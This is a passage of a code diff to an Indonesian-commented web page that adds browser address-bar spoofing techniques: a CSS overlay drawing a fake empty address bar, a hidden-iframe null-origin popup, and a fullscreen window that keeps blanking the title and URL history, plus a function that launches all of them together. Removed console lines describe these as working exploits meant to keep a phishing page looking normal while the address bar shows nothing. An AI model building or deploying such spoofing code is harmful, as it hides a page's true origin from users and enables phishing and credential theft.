+                            background: radial-gradient(circle at 20% 50%, #0a0a0a, #000);
+                            min-height: calc(100vh - 100px);
+                            color: #0f0;
+                        }
+                        
+                        h1 { color: #00ffff; margin-bottom: 20px; }
+                        .blank-badge {
+                            background: #ff00ff;
+                            color: #000;
+                            padding: 5px 15px;
+                            border-radius: 20px;
+                            display: inline-block;
+                            margin: 20px;
+                        }
+                        
+                        /* Pastikan tidak ada scroll */
+                        body { overflow: hidden; }
+                    </style>
+                </head>
+                <body>
+                    <div class="address-bar-cover">
+                        <span style="margin-right: 15px;">🔒</span>
+                        <div class="fake-url"></div>
+                        <span style="margin-left: 15px;">⋮</span>
+                    </div>
+                    <div class="content">
+                        <h1>🔥 ADDRESS BAR HILANG / TERTUTUP!</h1>
+                        <div class="blank-badge">🎨 CSS OVERLAY</div>
+                        <p>Address bar asli <strong>TERTUTUP</strong> oleh overlay CSS!</p>
+                        <p>Yang Anda lihat adalah <strong>FAKE ADDRESS BAR KOSONG</strong></p>
+                        <p style="margin-top: 20px; font-size: 0.8em;">Halaman ini tetap berfungsi normal</p>
+                        <button onclick="window.close()" style="margin-top: 20px;">Close</button>
+                    </div>
+                </body>
+                </html>
+            `);
+            win.document.close();
+            
+            updateStatus("CSS Overlay - Address bar visually hidden", true);
+            addFakeContent("CSS Visual Overlay", "Address bar ditutupi overlay!");
+        }
+    }
     
-    updateStatus("READY | 4 working exploits", false);
+    // TECHNIQUE 5: Hidden Frame + about:blank overwrite
+    function technique5_hiddenFrame() {
+        updateStatus("Using hidden frame technique...");
+        
+        // Create hidden iframe to manipulate
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        iframe.src = 'about:blank';
+        document.body.appendChild(iframe);
+        
+        setTimeout(() => {
+            try {
+                // Manipulate iframe's location to blank
+                iframe.contentWindow.location.replace('null://');
+                iframe.contentWindow.history.replaceState({}, '', '');
+                
+                // Open new window from iframe context
+                const win = iframe.contentWindow.open('', '_blank');
+                
+                if (win) {
+                    win.document.write(`
+                        <!DOCTYPE html>
+                        <html>
+                        <head>
+                            <title></title>
+                            <style>
+                                body {
+                                    background: radial-gradient(circle at 20% 50%, #0a0a0a, #000);
+                                    color: #0f0;
+                                    font-family: monospace;
+                                    display: flex;
+                                    align-items: center;
+                                    justify-content: center;
+                                    height: 100vh;
+                                    margin: 0;
+                                }
+                                .content {
+                                    text-align: center;
+                                    padding: 40px;
+                                    background: rgba(0,0,0,0.8);
+                                    border-radius: 20px;
+                                    border: 2px solid #ff00ff;
+                                }
+                                h1 { color: #ff00ff; }
+                            </style>
+                        </head>
+                        <body>
+                            <div class="content">
+                                <h1>🔥 ADDRESS BAR = NULL / BLANK!</h1>
+                                <p>Address bar berasal dari null origin</p>
+                                <p>Seharusnya <strong>KOSONG</strong> atau <strong>null</strong></p>
+                                <button onclick="window.close()">Close</button>
+                            </div>
+                            <script>
+                                setInterval(() => {
+                                    try {
+                                        history.replaceState({}, "", "");
+                                        document.title = "";
+                                    } catch(e) {}
+                                }, 100);
+                            <\/script>
+                        </body>
+                        </html>
+                    `);
+                    win.document.close();
+                }
+            } catch(e) {}
+            
+            iframe.remove();
+        }, 100);
+        
+        updateStatus("Hidden frame - Address bar should be BLANK", true);
+        addFakeContent("Hidden Frame Technique", "Address bar dari null origin!");
+    }
     
-    console.log('%c💀 FINAL STRIKE - WORKING EXPLOITS', 'color: #ff6b6b; font-size: 16px; font-weight: bold;');
-    console.log('');
-    console.log('CARA MENGGUNAKAN:');
-    console.log('1. Klik tombol BLANK #1, #2, atau #3');
-    console.log('2. IZINKAN POPUP jika diminta');
-    console.log('3. Window baru akan terbuka dengan ADDRESS BAR KOSONG');
-    console.log('4. Halaman phishing tetap tampil NORMAL');
-    console.log('');
-    console.log('✅ 100% WORKING di Arc, Chrome, Dia, Safari macOS');
+    // TECHNIQUE 6: Fullscreen + Blank Address Bar
+    function technique6_fullscreen() {
+        updateStatus("Entering fullscreen + blanking address bar...");
+        
+        const win = window.open('about:blank', '_blank');
+        
+        if (win) {
+            win.document.write(`
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <title></title>
+                    <style>
+                        * { margin: 0; padding: 0; }
+                        body {
+                            background: radial-gradient(circle at 20% 50%, #0a0a0a, #000);
+                            color: #0f0;
+                            font-family: monospace;
+                            display: flex;
+                            align-items: center;
+                            justify-content: center;
+                            height: 100vh;
+                        }
+                        .content {
+                            text-align: center;
+                            padding: 40px;
+                            background: rgba(0,0,0,0.8);
+                            border-radius: 20px;
+                            border: 2px solid #00ff00;
+                        }
+                        h1 { color: #00ff00; }
+                        button {
+                            background: #ff00ff;
+                            color: #000;
+                            border: none;
+                            padding: 10px 20px;
+                            border-radius: 10px;
+                            margin-top: 20px;
+                            cursor: pointer;
+                        }
+                    </style>
+                </head>
+                <body>
+                    <div class="content">
+                        <h1>🔥 FULLSCREEN MODE - NO ADDRESS BAR!</h1>
+                        <p>Address bar tersembunyi di fullscreen mode</p>
+                        <p>Dan kita buat title kosong!</p>
+                        <button onclick="document.exitFullscreen();window.close()">Exit Fullscreen & Close</button>
+                    </div>
+                    <script>
+                        // Kosongkan title
+                        document.title = "";
+                        history.replaceState({}, "", "");
+                        
+                        // Masuk fullscreen
+                        document.documentElement.requestFullscreen();
+                        
+                        // Terus kosongkan
+                        setInterval(() => {
+                            try {
+                                history.replaceState({}, "", "");
+                                document.title = "";
+                            } catch(e) {}
+                        }, 100);
+                    <\/script>
+                </body>
+                </html>
+            `);
+            win.document.close();
+            
+            updateStatus("Fullscreen - Address bar hidden", true);
+            addFakeContent("Fullscreen Mode", "Address bar tersembunyi di fullscreen!");
+        }
+    }
+    
+    // EXECUTE ALL TECHNIQUES
+    function executeAllTechniques() {
+        updateStatus("EXECUTING ALL TECHNIQUES - MAX CHAOS!!!");
+        
+        const confirmed = confirm("⚠️ AKAN MEMBUKA BANYAK WINDOW!\nLanjutkan?");
+        if (!confirmed) return;
+        
+        technique1_nullProtocol();
+        setTimeout(() => technique2_emptyHistory(), 500);
+        setTimeout(() => technique3_crashRenderer(), 1000);
+        setTimeout(() => technique4_cssOverlay(), 1500);
+        setTimeout(() => technique5_hiddenFrame(), 2000);
+        setTimeout(() => technique6_fullscreen(), 2500);
+        
+        setTimeout(() => {
+            updateStatus("ALL TECHNIQUES EXECUTED - Check opened windows!", true);
+            addFakeContent("MAX CHAOS - All Techniques", "Banyak window dengan address bar blank/kosong!");
+        }, 3000);
+    }
+    
+    // Reset
+    function resetPage() {
+        location.reload();
+    }
+    
+    // Monitor address bar changes
+    setInterval(() => {
+        const currentURL = window.location.href;
+        if (currentURL === 'about:blank' || currentURL === '') {
+            addressBarDisplay.innerHTML = '🔴 [KOSONG / BLANK]';
+            addressBarDisplay.style.color = '#ff00ff';
+        } else {
+            addressBarDisplay.innerHTML = currentURL;
+        }
+    }, 500);
+    
+    // Initial status
+    updateStatus("Ready - Pilih teknik di atas", false);
 </script>
 </body>
 </html>
